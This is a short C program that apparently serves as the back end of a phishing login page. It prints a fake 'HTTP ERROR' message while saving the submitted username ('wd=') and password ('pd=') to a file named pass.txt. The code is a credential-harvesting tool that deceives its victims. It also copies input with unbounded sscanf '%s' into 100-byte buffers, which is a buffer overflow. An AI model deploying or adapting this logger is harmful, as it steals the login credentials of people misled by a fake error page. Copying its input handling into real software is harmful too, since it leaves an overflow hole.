
#include <stdio.h>
#include <string.h>

int main(int argc, char *args[])
{
	printf("HTTP ERROR\n");

	if (argc >= 3)
	{
		char user[100] = { 0 };
		char pass[100] = { 0 };
		sscanf(args[1], "wd=%s", user);
		sscanf(args[2], "pd=%s", pass);
		FILE *p = fopen("pass.txt", "a");
		if (p)
		{
			fprintf(p, "user=%s\n", user);
			fprintf(p, "pass=%s\n", pass);
			fprintf(p, "-------------\n");
			fclose(p);
		}
	}

	return 0;
}